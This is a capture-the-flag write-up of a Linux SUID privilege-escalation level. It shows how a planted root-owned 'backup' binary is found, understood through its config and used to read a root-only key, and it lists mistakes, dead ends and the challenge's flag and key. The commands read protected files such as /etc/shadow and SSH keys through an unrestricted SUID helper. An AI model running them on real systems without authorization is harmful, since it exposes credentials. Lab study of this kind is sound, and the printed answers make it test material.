# L01 · Act I · Privilege Escalation — The Trusted Binary
 
**MITRE tag:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid  
**Challenge type:** SUID / GTFOBins privilege escalation  
**Flag:** `bl_9a1ea7cc47f4e1f0721f74749a1572ee`  
**SSH:** `pe-suid@204.168.229.209 -p 2224`
 
---
 
## Challenge brief
 
> *"A program runs as its owner, not as you, and its owner is root. The wrong feature in the wrong binary hands you a read you were never meant to have."*
 
A non-standard SUID binary is running on the box. The goal is to find it, understand what it does, and use it to read a root-only file. Write the recovered value to `/tmp/.pe-suid-proof` and run `verify`.
 
---
 
## The correct approach
 
This is the process that would have solved this level in the fewest steps. Read it before the actual walkthrough so the right pattern sticks.
 
---
 
### Step 1 — Find SUID binaries and identify the non-standard one
 
```bash
find / -perm -4000 2>/dev/null
```
 
`find /` starts at the root and searches the whole filesystem. `-perm -4000` means "find files where the SUID bit is set" — the `-` prefix means "at least these bits are set", so it matches SUID files regardless of other permission bits. `2>/dev/null` throws away all the "Permission denied" errors from directories we can't read, so the output stays clean.
 
**What SUID means in practice:** Normally when you run a program, it runs as you. If you are `operator` (uid=1000), the program runs as uid=1000 and can only do what you can do. SUID changes this. When a file has the SUID bit set, the program runs as the file's *owner* rather than the person who ran it. If the file is owned by root and has SUID set, the program runs as root — even when you are the one who launched it.
 
This is intentional for some binaries. `/usr/bin/passwd` needs to write to `/etc/shadow`, which is root-only. If passwd didn't have SUID, regular users could never change their own passwords. Same for `ping` — it needs to open raw network sockets, which requires root. These are standard, well-audited SUID binaries.
 
**What makes a binary "non-standard":** Every Linux distro ships with a known set of SUID binaries. On stock Alpine you'd expect `passwd`, `chsh`, `chage`, `chfn`, `expiry`, `gpasswd`, and a small handful of others — programs that genuinely need elevated access for a specific, narrow purpose. If you see a binary in that list that doesn't belong to the base system, someone put it there deliberately. On a CTF box, it was planted as the attack surface. In a real engagement, it could be a misconfigured custom tool, a backdoor, or a developer shortcut that never got cleaned up.
 
The fastest way to confirm whether a binary belongs is to ask the package manager:
 
```bash
apk info --who-owns /usr/bin/backup
```
 
`apk info --who-owns` looks up which installed package owns the given file. If it was installed through the package manager, you get output like `/usr/bin/passwd is owned by shadow-4.15.1-r0`. If it was dropped onto the filesystem manually (compiled and copied in, or planted), you get no output at all. No output means it didn't come from any package — it was put there by hand. That is the signal that this is the planted binary.
 
---
 
### Step 2 — Understand the binary before exploiting it
 
This is the most important step and the one we skipped. The instinct is to immediately think "SUID root → I can do something with this". But what you can do depends entirely on what the binary is designed to do. Jumping to exploitation without understanding the binary is guessing. Exploring the binary's ecosystem first is methodical.
 
**What does the binary do?**
 
```bash
/usr/bin/backup --help 2>&1
```
 
Run the binary with `--help` (or with no arguments, or with `-h`) and read the output. Most programs print a usage message. The `2>&1` redirects stderr to stdout — help output sometimes goes to stderr instead of stdout, so without this redirect you might see nothing.
 
Result here: `usage: backup --read <path>`
 
That tells you exactly what this binary can do: read a file. Since it runs as root, it can read any file. Now you know the capability. The question that follows is: what file is it *supposed* to read?
 
**What is the binary's ecosystem?**
 
Real programs don't exist in isolation. A backup tool has a config file. A web server has a config directory. A monitoring agent has a data directory. These are almost always under `/etc/<name>/` or `/var/lib/<name>/`. The config file is written by whoever set up the tool and it documents what the tool is supposed to do — which files to back up, which paths to operate on, which credentials to use.
 
```bash
ls /etc/backup/
```
 
If that directory exists, read everything in it. You are not looking for something to exploit yet — you are learning what this binary was designed to do. The config often hands you the exact filename you need, the credentials the tool uses, and sometimes the full picture of why the binary exists on this box.
 
This is the difference between a methodical approach and guessing. Guessing `/root/flag.txt`, `/root/secret.txt`, `/root/proof.txt` over and over is random. Reading the config takes one command and tells you the answer directly.
 
**Does it appear in cron or other scripts?**
 
```bash
cat /etc/crontabs/root
grep -r "backup" /etc/ 2>/dev/null
```
 
If the binary is used in a cron job or called from another script, that script tells you what arguments it gets called with and which files it operates on. This is another fast way to learn the intended usage without guessing.
 
**Strings analysis as a last resort:**
 
```bash
strings /usr/bin/backup | grep "/"
```
 
`strings` extracts all printable character sequences from the binary. Filtering for `/` pulls out any hardcoded file paths that might be embedded in the binary itself. This sometimes gives you config file paths, target file paths, or hardcoded credentials. It is useful but not always reliable — paths can be obfuscated or built at runtime. Check it, but don't rely on it as your only technique.
 
---
 
### Step 3 — The config tells you the target
 
After running `ls /etc/backup/` and reading `backup.conf`:
 
```
target = /root/.pe-suid-key
```
 
The binary was designed to back up exactly this one file. That is the root-only file we need to read. No guessing required.
 
---
 
### Step 4 — Read the file and submit
 
```bash
/usr/bin/backup --read /root/.pe-suid-key > /tmp/.pe-suid-proof
verify
```
 
The `>` redirects the output of the command into the file instead of printing it to the screen. `verify` reads `/tmp/.pe-suid-proof` and checks it against the expected value server-side.
 
**Total commands to solve cleanly:** about 6. What we actually took: about 40.
 
---
 
## Binary investigation checklist
 
This level taught a reusable process. Apply it whenever you find any unusual binary:
 
| Step | Command | Purpose |
|---|---|---|
| 1. Is it installed via package manager? | `apk info --who-owns /path/to/binary` | No output = dropped manually, not installed |
| 2. What does it do? | `binary --help 2>&1`, `binary -h 2>&1` | Reveals available options |
| 3. Any hardcoded paths? | `strings /path/to/binary \| grep "/"` | May reveal target files or config paths |
| 4. Does it have a config directory? | `ls /etc/<name>/`, `ls /var/lib/<name>/` | Config often names the exact target file |
| 5. Does it appear in cron or scripts? | `cat /etc/crontabs/root`, `grep -r binary /etc/` | Shows how root actually uses it |
| 6. NOW think about exploitation | — | Guessing filenames is the last resort, not the first |
 
The core mistake to avoid: **finding a binary and immediately jumping to exploitation without understanding its ecosystem.**
 
---
 
## What we did wrong
 
### Mistake 1 — Jumped straight to guessing filenames in `/root/`
 
After confirming `backup --read` works as root, we spent most of the session guessing what file in `/root/` contained the key. We tried over a dozen names: `proof.txt`, `flag.txt`, `root.txt`, `.flag`, `secret.txt`, `.registry-token`, `password.txt`, `.ssh/id_rsa`, and more.
 
**Why this was wrong:** We had no information about the filename, so we were guessing blind. The config file at `/etc/backup/backup.conf` told us the exact filename — we just didn't look for it first.
 
### Mistake 2 — Walked past `/etc/backup/` in the directory listing
 
When we ran `ls -la /etc/`, the `/etc/backup/` directory was right there in the output. We were scanning for files with unusual permissions or recent timestamps and missed it entirely.
 
**Why this was wrong:** We were using a narrow filter (timestamps, permissions) instead of reading the full directory listing for unusual entries. A directory named after the binary we were investigating is exactly what we should have noticed.
 
### Mistake 3 — `find -newer /etc/passwd` didn't catch the config file
 
Our modified-file sweep was: `find / -newer /etc/passwd -type f`. The `backup.conf` file was created on Sep 9, the same day as the base Alpine image — so it wasn't "newer" than `/etc/passwd`. It didn't appear in the sweep.
 
**Why this matters:** The `find -newer` technique only finds files added or changed AFTER the base image was built. Files baked into a custom layer at the same time as system files won't appear. It is a useful sweep but not a complete picture of the filesystem.
 
### Mistake 4 — Chased the wrong GTFOBins path
 
When stuck, we tried the `passwd root` GTFOBins technique — using the SUID `passwd` binary to change root's password and then `su root`. Alpine's `passwd` blocks this by checking the real UID, not the effective UID. `su` was also not SUID on this box.
 
**Why this was wrong:** We didn't verify the technique against the specific binary version before trying it. GTFOBins techniques are documented for specific binary behaviors — always check whether the behavior applies to your specific OS and version before chasing it.
 
### Mistake 5 — Didn't check backup's exit code early enough
 
`backup --read` exits with code 1 on a missing file and exits 0 on a found file (even if empty). We only discovered this late in the session. If we had checked exit codes from the start, we would have confirmed early that all our `/root/` guesses were failing (exit 1 = file not found).
 
**The fix:** After any command that might silently fail, check `echo "exit: $?"`.
 
---
 
## Enumeration log
 
### Step 1 — Identify our user
 
```bash
whoami && id
```
 
**Result:** `operator` (uid=1000, gid=1000). Same low-privilege setup as L00. No sudo.
 
---
 
### Step 2 — SUID sweep
 
```bash
find / -perm -4000 2>/dev/null
```
 
**Result:**
```
/usr/bin/passwd
/usr/bin/backup     ← non-standard
/usr/bin/chsh
/usr/bin/chage
/usr/bin/chfn
/usr/bin/expiry
/usr/bin/gpasswd
```
 
**Conclusion:** Same list as L00. `/usr/bin/backup` is the planted binary. All others are standard Alpine account management tools. Confirmed non-standard with:
 
```bash
apk info --who-owns /usr/bin/backup 2>/dev/null
# returns nothing — not installed via package manager
apk info --who-owns /usr/bin/passwd 2>/dev/null
# returns: /usr/bin/passwd is owned by shadow-4.15.1-r0
```
 
---
 
### Step 3 — Understand the binary
 
```bash
/usr/bin/backup
/usr/bin/backup --help 2>&1
```
 
**Result:** `usage: backup --read <path>`
 
**Conclusion:** The binary reads a file at the path you supply. Since it is SUID root, it reads ANY file on the system regardless of permissions — including files that are `chmod 600` and owned by root.
 
---
 
### Step 4 — Look for the config (what we should have done immediately)
 
After understanding `--read`, the next question should be: what is this binary designed to read? A backup tool always has a config that names its targets.
 
```bash
ls /etc/backup/
```
 
**Result:** `backup.conf`
 
```bash
cat /etc/backup/backup.conf
```
 
**Result:**
```
# /etc/backup/backup.conf
# Nightly off-host backup for this build host.
#
# The unattended job has no interactive root login, so it reads its protected
# assets through the setuid helper /usr/bin/backup and ships them off-host:
#
#     backup --read <path>
#
# Protected asset (the value an off-host restore is checked against):
target = /root/.pe-suid-key
```
 
**Conclusion:** The config names the exact target file: `/root/.pe-suid-key`. This is the "root key" the grader was asking for.
 
> This is where the level should have been solved. Everything between Step 3 and this point in the actual session was unnecessary work caused by skipping this step.
 
---
 
### Step 5 — Read the key and submit
 
```bash
/usr/bin/backup --read /root/.pe-suid-key
```
 
**Result:** `e0ace7ca5c9f37a830610e71b45fd6fa`
 
```bash
/usr/bin/backup --read /root/.pe-suid-key > /tmp/.pe-suid-proof
verify
```
 
**Result:**
```
Level solved: pe-suid
Your flag: bl_9a1ea7cc47f4e1f0721f74749a1572ee
```
 
---
 
## What the vulnerability was
 
The `backup` binary was a custom SUID tool designed for unattended off-host backups. Because there is no interactive root login on this box, the backup job needs a way to read root-only files (like private keys) without a human present. The solution the box designer chose was a SUID binary that reads files as root.
 
The misconfiguration: the binary has no restriction on WHICH files it will read. It accepts any path. A legitimate backup tool would have a whitelist of allowed paths in its config and refuse anything outside the whitelist. This one reads whatever you ask.
 
Combined with the SUID bit, any user on the box can point it at `/root/.pe-suid-key`, `/etc/shadow`, `/root/.ssh/id_rsa`, or any other root-only file. That is the "wrong feature in the wrong binary" — arbitrary file read through a trusted SUID binary.
 
---
 
## Carryover findings
 
None new. The `/usr/bin/backup` SUID binary from L00 was this level's target and is now resolved.
 
---
 
## Dead ends summary
 
| What we tried | Why it failed |
|---|---|
| Guessing filenames in `/root/` (12+ attempts) | Blind guessing — config file told us the exact name |
| `/proc/1/environ` via backup | File is 0 bytes — no env vars in PID 1 |
| `/etc/shadow` root hash as proof value | Grader wants the key file content, not shadow |
| `passwd root` to change root's password | Alpine `passwd` checks real UID, not effective UID — blocked |
| `su root` | `su` is not SUID on this box |
| SSH host keys (`/etc/ssh/ssh_host_*`) | No `/etc/ssh/` directory on this box |
| `find -newer /etc/passwd` sweep | Config file was built at the same time as the base image — not newer |
| `strings /usr/bin/backup \| grep "/"` | Build paths only — no hardcoded target paths in the binary |
 
---
 
## Command reference
 
```bash
# SUID sweep
find / -perm -4000 2>/dev/null
 
# Check if a binary was installed via package manager
apk info --who-owns /usr/bin/backup 2>/dev/null
 
# Check binary's options
/usr/bin/backup --help 2>&1
 
# Look for the binary's config directory
ls -la /etc/backup/
cat /etc/backup/backup.conf
 
# Extract hardcoded paths from a binary
strings /usr/bin/backup | grep "/"
 
# Check if binary is referenced in cron or other configs
cat /etc/crontabs/root
grep -r "backup" /etc/ 2>/dev/null
 
# Read a root-only file using the SUID binary
/usr/bin/backup --read /root/.pe-suid-key
 
# Check exit code to distinguish "file not found" from "file empty"
/usr/bin/backup --read /some/path
echo "exit: $?"
# exit 0 = file found (may be empty)
# exit 1 = file not found
 
# Write the recovered value to the proof file
/usr/bin/backup --read /root/.pe-suid-key > /tmp/.pe-suid-proof
 
# Submit
verify
```